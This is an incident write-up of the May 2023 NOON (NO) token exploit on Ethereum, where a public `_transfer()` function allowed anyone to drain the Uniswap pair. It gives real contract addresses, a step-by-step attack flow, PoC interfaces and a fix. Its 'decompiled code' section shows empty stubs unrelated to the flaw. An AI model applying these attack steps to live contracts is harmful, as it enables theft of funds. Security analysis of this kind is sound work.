# NOON (NO) Token Exploit — _transfer() Wrong Visibility Exposes Internal Function

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05 |
| Project | NOON (NO Token) |
| Chain | Ethereum |
| Loss | ~$2,000 |
| Attacker | Address unconfirmed |
| Attack TX | Address unconfirmed |
| Vulnerable Contract | NO Token: 0x6fEAc5F3792065b21f85BC118D891b33e0673bD8 |
| Block | 17,366,979 |
| CWE | CWE-284 (Improper Access Control — internal function exposed as public) |
| Vulnerability Type | _transfer() Wrong Visibility Enables Direct Pair Reserve Drain |

## Summary
The NO token's `_transfer()` function was accidentally declared `public` instead of `internal`. Any address could call it directly to transfer arbitrary amounts of NO from any address (including the Uniswap pair) to any recipient. The attacker called `_transfer(pair, attacker, pairBalance)` to drain the pair, then synced reserves and swapped for WETH.

## Vulnerability Details
- **CWE-284**: Standard ERC20 `_transfer()` is an internal accounting function not meant to be externally callable — it bypasses allowance checks. By declaring it `public`, the NO token allowed any caller to move tokens from any address to any destination without approval.

### On-Chain Original Code

Source: Bytecode Decompiled

```solidity
// File: NOON_decompiled.sol
    function burnFrom(address account, uint256 value) external {}  // ❌

// ...

    function symbol() external view returns (string memory) {}  // ❌

// ...

    function transfer(address account, uint256 value) external returns (bool) {}  // ❌

// ...

    function approveAndCall(address account, uint256 value, bytes data) external {}  // ❌

// ...

    function allowance(address account, address recipient) external view returns (uint256) {}  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. uint256 pairBalance = NO.balanceOf(address(Pair))
// 2. NO._transfer(address(Pair), address(this), pairBalance)
//    → public visibility: transfers all NO from Pair to attacker (no allowance check)
// 3. Pair.sync()
//    → update pair reserves to now-empty NO balance
// 4. NO.transfer(address(Pair), drainedAmount)
//    → return NO to pair to enable swap
// 5. uint256 amountOut = Router.getAmountOut(drainedAmount, newReserve0, newReserve1)
// 6. Pair.swap(0, amountOut, address(this), "")
//    → extract WETH at manipulated price
```

## Interfaces from PoC
```solidity
interface INO is IERC20 {
    function _transfer(address from, address to, uint256 amount) external;
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface Uni_Router_V2 {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256);
}
```

## Key Addresses
| Label | Address |
|---|---|
| NO Token | 0x6fEAc5F3792065b21f85BC118D891b33e0673bD8 |
| NO-WETH Pair | 0x421A5671306CB5f66FF580573C1c8D536E266c93 |
| WETH | 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 |
| Uniswap V2 Router | 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D |

## Root Cause
`_transfer()` was declared `public` instead of `internal` (or `override` of the internal ERC20 function). This exposed it as an unauthenticated external entry point that bypassed the standard `transferFrom` allowance mechanism.

## Fix
```solidity
// Override the internal ERC20 _transfer — NEVER declare it public:
function _transfer(
    address sender,
    address recipient,
    uint256 amount
) internal override {  // internal, not public
    // custom logic (fees, etc.)
    super._transfer(sender, recipient, amount);
}
```

## References
- Ethereum block 17,366,979
- NO Token: 0x6fEAc5F3792065b21f85BC118D891b33e0673bD8